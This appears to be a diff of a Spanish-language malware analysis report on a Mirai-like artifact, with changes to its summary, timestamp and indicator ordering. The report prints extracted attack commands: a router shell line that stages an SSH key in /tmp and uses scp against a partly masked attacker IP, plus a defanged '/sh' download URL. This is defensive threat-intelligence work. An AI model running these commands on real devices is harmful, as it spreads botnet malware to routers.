@@ -4,7 +4,8 @@
 
 ## 📌 Resumen
 
-Artefacto asociado a la familia **mirai-like** con evidencia suficiente para atribución. Comportamientos destacados: Cambio de permisos. Se asociaron 3 comandos observados o extraídos.
+Artefacto asociado a la familia **mirai-like** con evidencia suficiente para atribución. Comportamientos destacados: Cambio de permisos. Se identificaron 3 comandos observados o extraídos. Se identificaron 7 indicadores técnicos.
+
 
 ## 🏷️ Clasificación
 
@@ -15,7 +16,7 @@ Artefacto asociado a la familia **mirai-like** con evidencia suficiente para atr
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T19:36:13+00:00`
+- **Registrado:** `2026-08-09T19:36:13.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -44,22 +45,22 @@ Artefacto asociado a la familia **mirai-like** con evidencia suficiente para atr
 ## 🖥️ Comandos observados / extraídos
 
 ```text
+sshd:x:22:22:sshd:/var/empty:/bin/false
 [4lroot@TL-WR841N:~# cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----
 root@TL-WR841N:~# UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -F sshcfg -i key.ppk dlr@217.60.195.XXX
-sshd:x:22:22:sshd:/var/empty:/bin/false
 ```
 
 ## 🌐 Indicadores
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
-| ip | 217.60.195.XXX | static_analysis |
-| url | hxxps://217.60.195.XXX/sh | strings |
 | url | hxxps://217.60.195.XXX/sh) | strings |
-| hash | dedc6cc194b2bbb6fadae66ad44e029f13c489bda18247e928fc87f400a85208 | static_analysis |
+| url | hxxps://217.60.195.XXX/sh | strings |
+| ip | 217.60.195.XXX | static_analysis |
+| command | sshd:x:22:22:sshd:/var/empty:/bin/false | strings |
 | command | [4lroot@TL-WR841N:~# cd /tmp \|\| cd /var/tmp \|\| cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY----- | strings |
 | command | root@TL-WR841N:~# UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -F sshcfg -i key.ppk dlr@217.60.195.XXX | strings |
-| command | sshd:x:22:22:sshd:/var/empty:/bin/false | strings |
+| hash | dedc6cc194b2bbb6fadae66ad44e029f13c489bda18247e928fc87f400a85208 | static_analysis |
 | ip | [internal-ip-redacted] | artifact_source |
 
 ## 🛡️ Nota de publicación
